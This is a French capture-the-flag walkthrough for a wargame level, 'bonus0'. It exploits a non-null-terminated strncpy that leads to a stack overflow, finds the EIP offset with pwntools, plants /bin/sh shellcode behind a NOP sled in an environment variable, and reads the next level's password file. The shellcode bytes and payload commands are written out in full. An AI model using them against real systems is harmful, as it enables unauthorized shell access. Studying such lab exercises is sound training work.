### Bonus 0

#### Etape 01 :

La faille se trouve dans le `strncpy` car on va pouvoir copier une chaîne sans null terminator. Donc le `strcpy` suivant va copier plus loin que la chaîne qu’il reçoit.

Si on écrit plus de 20 caractères lors du premier input, alors `local_34` ne sera pas null-terminé, et `strcpy` va continuer à lire en mémoire jusqu'à trouver un `\0`. Donc `strcpy(param_1, local_34)` ne copie pas seulement 20 bytes, mais une quantité non contrôlée de données.

Ensuite on ajoute un espace (`" "`), puis `strcat(param_1, local_20)` ajoute encore 20 bytes contrôlés. On peut donc dépasser largement la taille du buffer.

#### Etape 02 :

Le buffer dans `main` fait 42 octets :

```c
char local_3a[42];
```

Mais avec ce comportement, on peut écrire bien plus que 42 bytes → buffer overflow → overwrite EIP.

On va chercher l'offset pour atteindre EIP. Avec un pattern generator ce sera plus simple :

```bash
python -c "from pwn import *; print(cyclic(200).decode())"
```

Important : b'' ne fait pas partie du pattern, il faut utiliser .decode().

On lance dans gdb :

```bash
gdb ./bonus0
(gdb) r
```

Pour le premier input on écrit plus de 20 caractères pour exploiter la faille sur strncpy. Dans le second input on met le pattern pour déterminer à quel moment on atteint EIP.

Une fois ceci fait :

```gdb
(gdb) i r
```

On obtient :

```bash
eip = 0x64616161
```

On utilise le pattern decoder :

```bash
python -c "from pwn import *; print(cyclic_find(0x64616161))"
```

On obtient 9. L’offset est donc de 9.

#### Etape 03 :

Pour placer le shellcode on va s’appuyer sur les variables d’environnement.

On lance le binaire avec :

```bash
env -i payload=$(python -c 'print "\x90"*500+"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"') gdb ./bonus0
```

\x90 est une instruction NOP, elle permet au processeur de passer à l’instruction suivante. On utilise un NOP sled pour augmenter les chances de tomber sur le shellcode sans avoir besoin d’une adresse exacte.

On met un breakpoint à main :

```gdb
(gdb) b main
(gdb) r
(gdb) x/500s environ
```

On repère notre payload :

```bash
0xbffffd8f: "payload=..."
0xbffffe57: "\x90\x90\x90..."
```

On choisit une adresse au milieu du NOP sled :

```bash
0xbffffe57
```

Conversion en little endian :

```bash
0xbffffe57 → "\x57\xfe\xff\xbf"
```

#### Etape 04 :

On construit le payload :

```bash
python -c 'print "e"*4095+"\n"+"e"*9+"\x57\xfe\xff\xbf"+"e"*7' > /tmp/exploit
```

Explication : "e"*4095 remplit complètement le premier read, \n sépare les deux inputs, "e"*9 correspond à l’offset jusqu’à EIP, l’adresse overwrite EIP, et le padding stabilise le payload.

On lance l’exploit :

```bash
cat /tmp/exploit - | env -i payload=$(python -c 'print "\x90"*500+"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"') ./bonus0
```

On obtient un shell :

```bash
whoami
bonus1
```

On peut ensuite récupérer le flag :

```bash
cat /home/user/bonus1/.pass
```